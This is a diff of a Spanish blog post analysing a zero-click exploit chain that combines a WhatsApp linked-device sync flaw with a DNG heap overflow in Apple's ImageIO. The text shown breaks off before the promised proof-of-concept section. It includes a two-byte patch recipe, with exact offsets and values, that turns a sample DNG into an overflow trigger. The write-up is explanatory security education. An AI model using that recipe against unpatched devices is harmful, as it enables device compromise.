@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="description" content="Análisis técnico de un ataque de cero clics (zero-click): profundizamos en el desbordamiento de memoria DNG (CVE-2025-43300), cadenas ROP y ejecución remota de código en iOS."><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.4.5"><!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-2QM8VN7Y8F"></script><script>
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="description" content="Análisis en profundidad de un ataque zero-click: cómo se combinaron el CVE-2025-55177 en WhatsApp y el CVE-2025-43300 en ImageIO de Apple para lograr la ejecución remota de código."><meta name="viewport" content="width=device-width"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.4.5"><!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-2QM8VN7Y8F"></script><script>
       window.dataLayer = window.dataLayer || [];
       function gtag() {
         dataLayer.push(arguments);
@@ -13,7 +13,7 @@
           page_title: document.title,
         });
       });
-    </script><title>El Ataque Invisible: Cómo una simple imagen de WhatsApp podía tomar el control total de tu iPhone | Blog de Jose Yeste</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/_slug_.CjTU3GNs.css" /><script type="module" src="/_astro/hoisted.DA22etMU.js"></script></head> <body class="relative text-black dark:text-white"> <div class="absolute top-0 bottom-0 z-[-2] min-h-screen w-full bg-gray-50 dark:bg-gray-950
+    </script><title>El Ataque Invisible: Cuando una Simple Imagen de WhatsApp Podía Tomar el Control Total de tu iPhone | Blog de Jose Yeste</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/_slug_.3viCf53Z.css" /><script type="module" src="/_astro/hoisted.DA22etMU.js"></script></head> <body class="relative text-black dark:text-white"> <div class="absolute top-0 bottom-0 z-[-2] min-h-screen w-full bg-gray-50 dark:bg-gray-950
       bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(217,216,255,0.5),rgba(255,255,255,0.9))]
       dark:bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(120,119,198,0.3),rgba(255,255,255,0))]"></div> <header class="fixed top-0 z-10 flex items-center justify-center w-full mx-auto mt-2" data-astro-cid-3ef6ksr2> <nav class="flex items-center gap-2 px-4 py-2 text-base font-semibold rounded-full text-gray-800 dark:text-gray-100 bg-white/90 dark:bg-gray-900/80 shadow-lg ring-1 ring-black/5 dark:ring-white/10 backdrop-blur-md" data-astro-cid-3ef6ksr2> <a class="relative block px-2 py-2 transition hover:text-yellow-500 dark:hover:text-yellow-400 " aria-label="experiencia" href="/#experiencia" data-astro-cid-3ef6ksr2> Experiencia </a><a class="relative block px-2 py-2 transition hover:text-yellow-500 dark:hover:text-yellow-400 " aria-label="proyectos" href="/#proyectos" data-astro-cid-3ef6ksr2> Proyectos </a><a class="relative block px-2 py-2 transition hover:text-yellow-500 dark:hover:text-yellow-400 text-yellow-500" aria-label="blog" href="/blog" data-astro-cid-3ef6ksr2> Blog </a><a class="relative block px-2 py-2 transition hover:text-yellow-500 dark:hover:text-yellow-400 " aria-label="sobre-mi" href="/#sobre-mi" data-astro-cid-3ef6ksr2> Sobre mí </a><a class="relative block px-2 py-2 transition hover:text-yellow-500 dark:hover:text-yellow-400 " aria-label="contacto" href="mailto:jose.yeste@gmail.com" data-astro-cid-3ef6ksr2> Contacto </a> <div class="relative ml-1 mr-1" data-astro-cid-x3pjskd3> <button id="theme-toggle-btn" class="appearance-none border-none flex h-10 w-10 items-center justify-center rounded-full bg-white/90 text-gray-700 shadow-sm ring-1 ring-black/5 transition hover:scale-105 hover:text-yellow-500 hover:ring-yellow-200/80 dark:bg-gray-800/90 dark:text-gray-100 dark:ring-white/10 dark:hover:text-yellow-200 dark:hover:ring-yellow-300/80" data-astro-cid-x3pjskd3> <span class="sr-only" data-astro-cid-x3pjskd3>Elige el tema</span> <svg id="light" class="theme-toggle-icon size-5 transition-all" data-astro-cid-x3pjskd3 width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0"></path> <path d="M3 12h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path> </svg> <svg id="dark" class="theme-toggle-icon absolute size-5 transition-all" data-astro-cid-x3pjskd3 width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> <svg id="system" class="theme-toggle-icon absolute size-5 transition-all" data-astro-cid-x3pjskd3 width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M3 5a1 1 0 0 1 1 -1h16a1 1 0 0 1 1 1v10a1 1 0 0 1 -1 1h-16a1 1 0 0 1 -1 -1v-10z"></path> <path d="M7 20h10"></path> <path d="M9 16v4"></path> <path d="M15 16v4"></path> </svg> </button> <div id="themes-menu" class="absolute hidden scale-80 top-8 right-0 text-sm p-1 min-w-[8rem] rounded-md border border-gray-100 bg-white/90 dark:bg-gray-900/90 dark:border-gray-500/20 shadow-[0_3px_10px_rgb(0,0,0,0.2)] backdrop-blur-md" data-astro-cid-x3pjskd3> <ul data-astro-cid-x3pjskd3> <li class="themes-menu-option px-2 py-1.5 cursor-default hover:bg-neutral-400/40 dark:hover:bg-gray-500/50 rounded-sm" data-theme="light" data-astro-cid-x3pjskd3> Light </li><li class="themes-menu-option px-2 py-1.5 cursor-default hover:bg-neutral-400/40 dark:hover:bg-gray-500/50 rounded-sm" data-theme="dark" data-astro-cid-x3pjskd3> Dark </li><li class="themes-menu-option px-2 py-1.5 cursor-default hover:bg-neutral-400/40 dark:hover:bg-gray-500/50 rounded-sm" data-theme="system" data-astro-cid-x3pjskd3> System </li> </ul> </div> </div>   <script>
   ;(() => {
@@ -72,193 +72,591 @@
   })()
 </script> </nav> </header>    <main class="px-4"> <section id="blog" data-section="blog" class="section py-16 md:py-24 space-y-10 scroll-m-20 w-full mx-auto container lg:max-w-4xl md:max-w-2xl">  <div class="space-y-4"> <a href="/blog" class="inline-flex items-center gap-2 text-sm font-semibold text-yellow-600 transition hover:gap-3 dark:text-yellow-200">
 ← Volver al blog
-</a> <span class="rounded-full bg-gray-900 px-4 py-1 text-xs font-semibold uppercase tracking-[0.15rem] text-yellow-300 dark:bg-gray-100 dark:text-gray-900"> Ciberseguridad </span> <h1 class="text-4xl font-bold text-gray-900 dark:text-white"> El Ataque Invisible: Cómo una simple imagen de WhatsApp podía tomar el control total de tu iPhone </h1> <div class="flex flex-wrap items-center gap-3 text-sm text-gray-600 dark:text-gray-300"> <span>29 de julio de 2026</span> <span class="text-gray-400">·</span> <span>10 min</span> <span class="text-gray-400">·</span> <ul class="flex flex-wrap gap-2"> <li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Ciberseguridad </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> iOS </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> WhatsApp </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Zero-Click </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> CVE </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Buffer Overflow </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> ROP </li> </ul> </div> </div> <article class="prose prose-lg mx-auto mt-6 text-gray-800 prose-headings:text-gray-900 prose-a:text-yellow-600 dark:prose-invert dark:text-gray-50 dark:prose-headings:text-white dark:prose-a:text-yellow-300"> <blockquote>
+</a> <span class="rounded-full bg-gray-900 px-4 py-1 text-xs font-semibold uppercase tracking-[0.15rem] text-yellow-300 dark:bg-gray-100 dark:text-gray-900"> Ciberseguridad </span> <h1 class="text-4xl font-bold text-gray-900 dark:text-white"> El Ataque Invisible: Cuando una Simple Imagen de WhatsApp Podía Tomar el Control Total de tu iPhone </h1> <div class="flex flex-wrap items-center gap-3 text-sm text-gray-600 dark:text-gray-300"> <span>29 de julio de 2026</span> <span class="text-gray-400">·</span> <span>12 min</span> <span class="text-gray-400">·</span> <ul class="flex flex-wrap gap-2"> <li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Ciberseguridad </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> iOS </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> WhatsApp </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Zero-Click </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> CVE </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> Buffer Overflow </li><li class="rounded-full bg-gray-100 px-3 py-1 font-medium text-gray-700 dark:bg-gray-800 dark:text-gray-200"> ROP </li> </ul> </div> </div> <article class="prose prose-lg mx-auto mt-6 text-gray-800 prose-headings:text-gray-900 prose-a:text-yellow-600 dark:prose-invert dark:text-gray-50 dark:prose-headings:text-white dark:prose-a:text-yellow-300"> <blockquote>
 <p><em>“No necesitas hacer clic en nada. No necesitas abrir el mensaje. Solo recibirlo basta.”</em></p>
 </blockquote>
 <hr>
-<h2 id="-el-resumen-para-los-que-tienen-prisa">🎯 El Resumen (para los que tienen prisa)</h2>
-<p>En agosto de 2025, se descubrió una cadena de ataque <strong>de “cero clics”</strong> (<em>zero-click</em>) contra WhatsApp en iOS. Esto significa que <strong>con solo conocer tu número de teléfono</strong>, un atacante podía comprometer el dispositivo <strong>sin que el usuario hiciera nada</strong>: ni abrir el chat, ni descargar la imagen, ni hacer clic en ningún enlace.</p>
-<p>La cadena de ataque combinaba <strong>dos vulnerabilidades encadenadas</strong>:</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<table><thead><tr><th align="left">Vulnerabilidad</th><th align="left">Componente</th><th align="left">Mecanismo de explotación</th></tr></thead><tbody><tr><td align="left"><strong>CVE-2025-55177</strong></td><td align="left">WhatsApp (iOS/Mac)</td><td align="left">Sincronización falsa que fuerza la descarga en segundo plano</td></tr><tr><td align="left"><strong>CVE-2025-43300</strong></td><td align="left">Apple ImageIO (<code>RawCamera.bundle</code>)</td><td align="left">Desbordamiento de búfer en el <em>heap</em> al procesar metadatos DNG</td></tr></tbody></table>
-<p>Ambas fueron parcheadas por WhatsApp y Apple. Sin embargo, analizar la arquitectura de este exploit es fascinante para entender la ingeniería detrás de los ataques modernos en sistemas móviles.</p>
+<h2 id="-índice">📖 Índice</h2>
+<ol>
+<li><a href="#-el-resumen-ejecutivo">El Resumen Ejecutivo</a></li>
+<li><a href="#-qu%C3%A9-es-un-ataque-de-cero-clics">¿Qué es un Ataque de “Cero Clics”?</a></li>
+<li><a href="#-los-dos-eslabones-de-la-cadena">Los Dos Eslabones de la Cadena</a></li>
+<li><a href="#-primer-eslab%C3%B3n-el-enga%C3%B1o-a-whatsapp-cve-2025-55177">Primer Eslabón: El Engaño a WhatsApp (CVE-2025-55177)</a></li>
+<li><a href="#-segundo-eslab%C3%B3n-la-imagen-que-explota-el-sistema-cve-2025-43300">Segundo Eslabón: La Imagen que Explota el Sistema (CVE-2025-43300)</a></li>
+<li><a href="#-el-coraz%C3%B3n-del-ataque-ejecuci%C3%B3n-de-c%C3%B3digo">El Corazón del Ataque: Ejecución de Código</a></li>
+<li><a href="#-desviaci%C3%B3n-del-flujo-de-control-secuestrando-el-mapa-de-ruta">Desviación del Flujo de Control: Secuestrando el Mapa de Ruta</a></li>
+<li><a href="#-la-cadena-rop-construyendo-con-piezas-de-lego-del-sistema">La Cadena ROP: Construyendo con Piezas de Lego del Sistema</a></li>
+<li><a href="#-sortear-las-defensas-de-ios-c%C3%B3mo-se-burlan-las-mitigaciones">Sortear las Defensas de iOS: Cómo se Burlan las Mitigaciones</a></li>
+<li><a href="#-el-c%C3%B3digo-prueba-de-concepto-paso-a-paso">El Código: Prueba de Concepto Paso a Paso</a></li>
+<li><a href="#-diagrama-visual-del-ataque-completo">Diagrama Visual del Ataque Completo</a></li>
+<li><a href="#-c%C3%B3mo-protegerse">¿Cómo Protegerse?</a></li>
+<li><a href="#-recursos-para-profundizar">Recursos para Profundizar</a></li>
+<li><a href="#-conclusi%C3%B3n">Conclusión</a></li>
+</ol>
 <hr>
-<h2 id="-los-fundamentos-qué-es-un-ataque-de-cero-clics">🧩 Los Fundamentos: ¿Qué es un ataque de “cero clics”?</h2>
-<p>En la mayoría de vectores de ataque tradicionales (phishing, enlaces maliciosos, troyanos), se requiere la interacción de la víctima. En un ataque de <strong>cero clics</strong> (<em>zero-click</em>), la superficie de entrada se activa automáticamente al recibir el paquete de datos en segundo plano.</p>
-<p>El flujo de explotación funcionaba como una <strong>cadena de dos eslabones</strong>:</p>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span>1. Recepción de mensaje de sincronización manipulado (WhatsApp)</span></span>
-<span class="line"><span>                        ↓</span></span>
-<span class="line"><span>2. WhatsApp valida erróneamente el origen y descarga la imagen DNG</span></span>
-<span class="line"><span>                        ↓</span></span>
-<span class="line"><span>3. El demonio de procesamiento de imágenes de iOS indexa la imagen</span></span>
-<span class="line"><span>                        ↓</span></span>
-<span class="line"><span>4. Desbordamiento de memoria (Buffer Overflow) y ejecución de código (RCE)</span></span></code></pre>
+<h2 id="-el-resumen-ejecutivo">🎯 El Resumen Ejecutivo</h2>
+<p>En agosto de 2025, investigadores de seguridad descubrieron una cadena de exploits que permitía a un atacante comprometer un iPhone <strong>con solo saber el número de teléfono de la víctima</strong>. No se requería que el usuario abriera el mensaje, hiciera clic en un enlace ni descargara nada. Bastaba con que el mensaje <strong>llegara</strong> para que el dispositivo quedara totalmente controlado.</p>
+<p>Este ataque de <strong>“cero clics”</strong> (zero-click) encadenaba dos vulnerabilidades:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Vulnerabilidad</th><th align="left">Componente Afectado</th><th align="left">Función</th></tr></thead><tbody><tr><td align="left"><strong>CVE-2025-55177</strong></td><td align="left">WhatsApp para iOS</td><td align="left">Permite engañar a la aplicación para que descargue contenido malicioso</td></tr><tr><td align="left"><strong>CVE-2025-43300</strong></td><td align="left">ImageIO de Apple (iOS)</td><td align="left">Provoca un desbordamiento de búfer al procesar una imagen DNG manipulada</td></tr></tbody></table>
+<p>Ambas vulnerabilidades fueron <strong>parcheadas rápidamente</strong> por Apple y WhatsApp. Pero entender cómo funcionan no solo es fascinante, sino que nos ayuda a comprender las amenazas del mundo digital y cómo protegernos.</p>
 <hr>
-<h2 id="-el-primer-eslabón-sincronización-de-dispositivos-cve-2025-55177">🔗 El Primer Eslabón: Sincronización de Dispositivos (CVE-2025-55177)</h2>
-<h3 id="el-fallo-de-autenticación-en-la-sincronización">El fallo de autenticación en la sincronización</h3>
-<p>WhatsApp permite vincular múltiples dispositivos (WhatsApp Web, escritorio, iPad) compartiendo claves de sesión. Para mantener los chats al día, el sistema intercambia peticiones de sincronización en segundo plano.</p>
-<p>La vulnerabilidad residía en que <strong>WhatsApp para iOS no validaba adecuadamente la firma de origen</strong> en las peticiones de sincronización de medios entrantes.</p>
-<h3 id="el-vector-de-descarga-forzada">El vector de descarga forzada</h3>
-<p>Un atacante podía forjar un mensaje de protocolo indicando:</p>
+<h2 id="-qué-es-un-ataque-de-cero-clics">🧩 ¿Qué es un Ataque de “Cero Clics”?</h2>
+<p>Imagina que recibes un mensaje de WhatsApp. No lo abres. No le das a “ver imagen”. Ni siquiera desbloqueas el teléfono. Simplemente <strong>llega</strong>. Y con eso, tu teléfono ya está comprometido.</p>
+<p>Eso es un ataque de <strong>cero clics</strong>: no requiere ninguna interacción por parte del usuario. Son los ataques más peligrosos porque son <strong>invisibles</strong>. No hay nada que el usuario pueda hacer para evitarlos, más allá de mantener su software actualizado.</p>
+<p>En el caso que nos ocupa, el ataque funcionaba como una cadena de dos eslabones:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span>1. 📨 Llega un mensaje de WhatsApp “especial”</span></span>
+<span class="line"><span>                ↓</span></span>
+<span class="line"><span>2. 🔓 WhatsApp se engaña y descarga una imagen DNG</span></span>
+<span class="line"><span>                ↓</span></span>
+<span class="line"><span>3. 💥 El sistema iOS procesa la imagen maliciosa</span></span>
+<span class="line"><span>                ↓</span></span>
+<span class="line"><span>4. 🎯 El teléfono queda completamente comprometido</span></span></code></pre>
+<hr>
+<h2 id="-los-dos-eslabones-de-la-cadena">🔗 Los Dos Eslabones de la Cadena</h2>
+<p>Para que un ataque de este tipo tenga éxito, rara vez se utiliza una sola vulnerabilidad. Los atacantes encadenan múltiples fallos para lograr su objetivo. En este caso, la cadena tenía dos eslabones:</p>
+<ol>
+<li><strong>Un fallo en la lógica de WhatsApp</strong> que permitía al atacante <strong>entregar</strong> el payload malicioso.</li>
+<li><strong>Un fallo en el sistema operativo de Apple</strong> que permitía <strong>ejecutar</strong> ese payload.</li>
+</ol>
+<p>El primer eslabón es el “caballo de Troya”: el método de entrega. El segundo es el “explosivo”: el mecanismo que toma el control del dispositivo.</p>
+<hr>
+<h2 id="-primer-eslabón-el-engaño-a-whatsapp-cve-2025-55177">📱 Primer Eslabón: El Engaño a WhatsApp (CVE-2025-55177)</h2>
+<h3 id="qué-fallaba">¿Qué fallaba?</h3>
+<p>WhatsApp permite vincular <strong>dispositivos adicionales</strong>: WhatsApp Web, la aplicación de escritorio, etc. Cuando vinculas un dispositivo, WhatsApp sincroniza mensajes entre ellos.</p>
+<p>El problema era que <strong>WhatsApp no verificaba correctamente</strong> que los mensajes de sincronización provinieran realmente de un dispositivo que tú hubieras autorizado.</p>
+<h3 id="el-engaño">El Engaño</h3>
+<p>Un atacante podía <strong>fabricar un mensaje</strong> que se hiciera pasar por uno de tus dispositivos vinculados. Este mensaje le decía a WhatsApp:</p>
 <blockquote>
-<p><em>“Este mensaje proviene de tu cliente secundario vinculado. Descarga de inmediato el recurso multimedia de esta URL para pre-procesar su miniatura.”</em></p>
+<p><em>“Oye, soy tu ordenador. Por favor, descarga este contenido de esta URL y procésalo.”</em></p>
 </blockquote>
-<p>Al no verificar si la petición provenía realmente de un dispositivo autorizado de la cuenta, WhatsApp <strong>descargaba automáticamente el archivo multimedia</strong> y lo entregaba al subsistema de procesamiento multimedia del sistema operativo.</p>
+<p>Y WhatsApp, confiando en el mensaje falso, <strong>obedecía sin preguntar</strong>.</p>
+<h3 id="analogía-para-todos-los-públicos">Analogía para Todos los Públicos</h3>
+<p>Imagina que alguien llama a la puerta de tu casa diciendo: <em>“Soy el cerrajero que llamaste”</em>. Tú le abres sin pedir identificación porque confías en que dice la verdad. Pero no es tu cerrajero: es un ladrón que acaba de conseguir entrar en tu casa.</p>
+<p>Eso es exactamente lo que hacía esta vulnerabilidad: el atacante se hacía pasar por un dispositivo de confianza y WhatsApp le abría la puerta.</p>
+<h3 id="detalle-técnico">Detalle Técnico</h3>
+<p>La vulnerabilidad residía en una <strong>autorización insuficiente</strong> en el proceso de sincronización de dispositivos vinculados. El protocolo de WhatsApp no validaba adecuadamente el origen de los mensajes de sincronización, permitiendo que un atacante <strong>inyectara mensajes maliciosos</strong> que la aplicación procesaba como legítimos.</p>
 <p><strong>Versiones afectadas</strong>:</p>
 <ul>
-<li>WhatsApp para iOS <code>&#x3C; 2.25.21.73</code></li>
-<li>WhatsApp Business para iOS <code>&#x3C; 2.25.21.78</code></li>
-<li>WhatsApp para Mac <code>&#x3C; 2.25.21.78</code></li>
+<li>WhatsApp para iOS anterior a la <strong>2.25.21.73</strong></li>
+<li>WhatsApp Business para iOS anterior a la <strong>2.25.21.78</strong></li>
+<li>WhatsApp para Mac anterior a la <strong>2.25.21.78</strong></li>
 </ul>
 <hr>
-<h2 id="-el-segundo-eslabón-la-imagen-que-explota-el-sistema-cve-2025-43300">💥 El Segundo Eslabón: La Imagen que Explota el Sistema (CVE-2025-43300)</h2>
-<p>Una vez descargada la imagen en el almacenamiento local del dispositivo, iOS utiliza el framework <strong>ImageIO</strong> y el paquete <strong><code>RawCamera.bundle</code></strong> para generar vistas previas y procesar archivos RAW.</p>
-<h3 id="️️-la-analogía-del-restaurante">🕵️‍♂️ La Analogía del Restaurante</h3>
-<p>Para entender cómo un simple archivo gráfico puede doblegar las defensas de un iPhone, imaginemos el procesamiento de memoria como la gestión de mesas en un restaurante:</p>
+<h2 id="-segundo-eslabón-la-imagen-que-explota-el-sistema-cve-2025-43300">💥 Segundo Eslabón: La Imagen que Explota el Sistema (CVE-2025-43300)</h2>
+<p>Esta es la parte más técnica y fascinante del ataque. Una vez que WhatsApp descargaba la imagen maliciosa, el sistema operativo de Apple <strong>la procesaba automáticamente</strong> y se activaba la vulnerabilidad.</p>
+<h3 id="qué-es-un-archivo-dng">¿Qué es un archivo DNG?</h3>
+<p>DNG (<strong>Digital Negative</strong>) es un formato de imagen creado por Adobe para fotos en “raw” (sin procesar). Los fotógrafos profesionales lo usan porque conserva toda la información capturada por el sensor de la cámara.</p>
+<p>Dentro de un archivo DNG hay <strong>dos partes fundamentales</strong>:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Parte</th><th align="left">Contiene</th><th align="left">Parámetro Clave</th></tr></thead><tbody><tr><td align="left"><strong>Metadatos TIFF</strong></td><td align="left">Información sobre la imagen (tamaño, color, etc.)</td><td align="left"><code>SamplesPerPixel</code> (número de canales de color)</td></tr><tr><td align="left"><strong>Stream JPEG</strong></td><td align="left">Los datos de imagen comprimidos sin pérdida</td><td align="left"><code>NumComponents</code> (componentes en el JPEG)</td></tr></tbody></table>
+<p>Ambos parámetros <strong>deberían coincidir</strong>. Por ejemplo, una imagen en color RGB tiene 3 canales. Tanto los metadatos como el JPEG deberían decir “3”.</p>
+<h3 id="la-vulnerabilidad">La Vulnerabilidad</h3>
+<p>El error estaba en el componente de Apple que procesa estas imágenes: <strong><code>RawCamera.bundle</code></strong> dentro del framework <strong>ImageIO</strong>.</p>
+<p>El problema ocurría cuando <strong>los dos valores no coincidían</strong>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0"><code><span class="line"><span>Metadatos TIFF:  SamplesPerPixel = 2  (dice "2 canales")</span></span>
+<span class="line"><span>Stream JPEG:     NumComponents = 1    (dice "1 canal")</span></span></code></pre>
+<h3 id="qué-pasaba-entonces">¿Qué pasaba entonces?</h3>
 <ol>
-<li><strong>La Reserva de Espacio:</strong> El sistema (el camarero) lee los metadatos TIFF y reserva una mesa para 2 comensales (<code>SamplesPerPixel = 2</code>).</li>
-<li><strong>La Entrada de Datos:</strong> El decodificador lee los datos reales del JPEG (<code>SOF3</code>) que resultan ser de solo 1 comensal (<code>NumComponents = 1</code>), pero procesa los datos con un formato desalineado.</li>
-<li><strong>El Desbordamiento:</strong> El camarero, confundido por la falta de coincidencia, empieza a escribir la información fuera del espacio reservado. Escribe directamente en la mesa de al lado, corrompiendo la reserva de otros clientes.</li>
-<li><strong>La Corrupción Calculada:</strong> El atacante ha diseñado la imagen DNG para que esta escritura fuera de límites no sea accidental. Coloca datos especialmente estructurados que sobrescriben una dirección de memoria crítica: <strong>el puntero que le dice al programa qué instrucción ejecutar a continuación</strong>.</li>
-<li><strong>La Redirección del Control:</strong> Cuando el programa termina su tarea actual, consulta esa dirección de memoria. Como el atacante la ha modificado, el sistema salta directamente a ejecutar <strong>las instrucciones del atacante</strong> en lugar del código legítimo.</li>
+<li>El sistema <strong>leía los metadatos</strong> y veía <code>SamplesPerPixel = 2</code>.</li>
+<li><strong>Reservaba memoria</strong> suficiente para 2 canales de color.</li>
+<li>Luego <strong>procesaba los datos JPEG</strong> y veía <code>NumComponents = 1</code>.</li>
+<li><strong>Escribía los datos</strong> como si solo hubiera 1 canal.</li>
+</ol>
+<p><strong>El problema</strong>: el sistema escribía datos en una zona de memoria que no había reservado correctamente. Esto se llama <strong>desbordamiento de búfer</strong> (buffer overflow).</p>
+<h3 id="analogía-para-todos-los-públicos-1">Analogía para Todos los Públicos</h3>
+<p>Imagina que reservas una mesa para <strong>2 personas</strong>. El camarero te prepara una mesa con 2 sillas (reserva memoria para 2 canales). Sin embargo, cuando llegas al restaurante, resulta que has traído a <strong>1 persona</strong> (los datos reales de la imagen). El camarero, confundido, escribe la información del único comensal <strong>fuera</strong> de la mesa que reservó, en la mesa de al lado. Eso provoca un caos: la reserva de otros clientes se corrompe.</p>
+<p>En el mundo del software, ese caos es una <strong>corrupción de memoria</strong> que un atacante puede aprovechar para ejecutar código malicioso.</p>
+<h3 id="el-truco-de-los-2-bytes">El Truco de los 2 Bytes</h3>
+<p>Lo más alucinante es que <strong>solo hacía falta modificar 2 bytes</strong> en un archivo DNG legítimo para crear el exploit.</p>
+<p>En un DNG de muestra (de la cámara <strong>Pentax K-3 Mark III</strong>), los investigadores encontraron que cambiando estos dos valores bastaba:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Offset (hex)</th><th align="left">Valor Original</th><th align="left">Cambio</th><th align="left">Efecto</th></tr></thead><tbody><tr><td align="left"><code>0x2FD00</code></td><td align="left"><code>01</code></td><td align="left">→ <code>02</code></td><td align="left">SamplesPerPixel pasa de 1 a 2</td></tr><tr><td align="left"><code>0x3E40B</code></td><td align="left"><code>02</code></td><td align="left">→ <code>01</code></td><td align="left">NumComponents pasa de 2 a 1</td></tr></tbody></table>
+<p><strong>Solo dos bytes</strong>. Dos pequeños números en un archivo de imagen. Y con eso, un iPhone entero podía ser comprometido.</p>
+<hr>
+<h2 id="-el-corazón-del-ataque-ejecución-de-código">🧠 El Corazón del Ataque: Ejecución de Código</h2>
+<p>Llegamos al núcleo de la cuestión: ¿cómo se pasa de un simple error de memoria a tener el control total del dispositivo?</p>
+<h3 id="la-analogía-del-restaurante-parte-2">La Analogía del Restaurante (Parte 2)</h3>
+<p>Recordemos la analogía del restaurante:</p>
+<ol>
+<li>El sistema (el camarero) reserva una mesa para 2 personas (<code>SamplesPerPixel = 2</code>).</li>
+<li>Los datos de la imagen (los comensales) resultan ser solo 1 persona (<code>SOF3 = 1</code>).</li>
+</ol>
+<p>Ahora, el paso 4, <strong>“El Peligro Real: Ejecución de Código”</strong>, es donde el caos se convierte en un plan malicioso.</p>
+<ul>
+<li><strong>El Desbordamiento</strong>: El camarero, confundido, escribe la información del único comensal (1 persona) <strong>fuera</strong> de la mesa que reservó. Escribe en la mesa de al lado, corrompiendo la reserva de otros clientes.</li>
+<li><strong>La Corrupción</strong>: El atacante ha diseñado el pedido (la imagen DNG) para que esta “escritura fuera de lugar” no sea aleatoria. Ha colocado datos especialmente preparados en la imagen que, al ser escritos fuera del búfer, <strong>sobrescriben una dirección de memoria muy importante</strong>: la que le dice al programa qué instrucción ejecutar a continuación.</li>
+<li><strong>La Redirección</strong>: El programa, al llegar al final de su tarea, mira esa dirección de memoria para saber qué hacer después. El atacante la ha modificado para que apunte a… ¡<strong>su propio código malicioso</strong>! El programa, engañado, ejecuta las instrucciones del atacante en lugar de las suyas propias.</li>
+</ul>
+<h3 id="en-términos-técnicos">En Términos Técnicos</h3>
+<p>El atacante ha convertido un simple error de “espacio” (escribir fuera de la mesa) en un error de “control” (decidir qué hace el programa a continuación). Esto se conoce como <strong>Ejecución Remota de Código (RCE)</strong>, y es el escenario más peligroso en seguridad informática.</p>
+<hr>
+<h2 id="-desviación-del-flujo-de-control-secuestrando-el-mapa-de-ruta">🎯 Desviación del Flujo de Control: Secuestrando el Mapa de Ruta</h2>
+<p>Recordemos el desbordamiento de búfer. Es como si un programa tuviera una libreta donde escribe las cosas que tiene que hacer.</p>
+<ul>
+<li><strong>El Desbordamiento</strong>: Al escribir fuera de la zona que le corresponde (el búfer), el atacante “mancha” o sobrescribe otras partes de la libreta del programa.</li>
+<li><strong>El Objetivo</strong>: El atacante no mancha la libreta al azar. Su objetivo es sobrescribir una parte muy específica: la que contiene la <strong>dirección de la siguiente instrucción</strong> que el programa debe ejecutar. Esa dirección es como la siguiente parada en un mapa de ruta.</li>
+</ul>
+<h3 id="la-analogía-del-mapa-de-ruta">La Analogía del Mapa de Ruta</h3>
